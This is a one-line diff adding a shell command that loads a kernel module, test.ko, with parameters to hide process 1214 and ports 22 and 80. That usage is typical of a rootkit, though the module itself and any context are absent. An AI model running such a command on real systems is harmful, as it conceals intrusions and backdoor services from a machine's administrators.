@@ -1,0 +1,1 @@
+insmod test.ko hide_pids="1214" hide_ports="22,80"
